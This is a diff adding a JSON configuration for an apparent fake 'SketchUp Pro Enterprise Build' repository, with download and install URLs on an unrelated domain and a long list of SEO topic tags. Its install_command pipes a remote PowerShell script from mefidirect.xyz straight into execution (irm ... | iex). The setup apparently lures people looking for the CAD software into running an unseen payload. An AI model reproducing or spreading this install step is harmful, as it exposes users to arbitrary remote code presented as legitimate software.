@@ -1,0 +1,28 @@
+{
+  "repo": "sketchup-pro-enterprise-build",
+  "product": "SketchUp Pro Enterprise Build",
+  "kind": "cad",
+  "install_type": "download",
+  "download_url": "https://sketchup.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new32",
+  "format": "license-md-only",
+  "category": "cad",
+  "topics": [
+    "sketchup-suite",
+    "sketchup-release",
+    "sketchup-guide",
+    "windows-10",
+    "install-guide",
+    "sketchup-faq",
+    "getting-started",
+    "sketchup-install-steps",
+    "quick-tips",
+    "blueprint-editor",
+    "user-manual",
+    "engineering-design",
+    "windows-11",
+    "sketchup-pc-edition"
+  ]
+}
